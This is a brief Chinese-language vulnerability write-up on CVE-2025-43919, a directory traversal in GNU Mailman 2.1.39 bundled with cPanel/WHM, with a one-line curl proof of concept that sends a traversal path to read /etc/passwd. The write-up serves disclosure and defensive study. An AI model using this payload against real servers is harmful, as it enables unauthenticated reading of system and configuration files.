# GNU Mailman目录遍历漏洞(CVE-2025-43919)

# 漏洞描述
GNU Mailman 2.1.39 与 cPanel 和 WHM 捆绑在一起，在终端中存在一个严重的目录遍历漏洞。由于 CGI 脚本的输入验证不足，/mailman/private/mailman未经身份验证的攻击者可以利用此漏洞读取服务器上的任意文件，例如Mailman 配置文件。此漏洞存在严重的信息泄露风险，并且与其他漏洞利用程序结合使用时，可能会引发进一步的攻击。

# poc
```
curl -X POST -d "username=../../../../etc/passwd&password=x&submit=Let+me+in..." http://target/mailman/private/mailman
```

漏洞原文:https://github.com/0NYX-MY7H/CVE-2025-43919
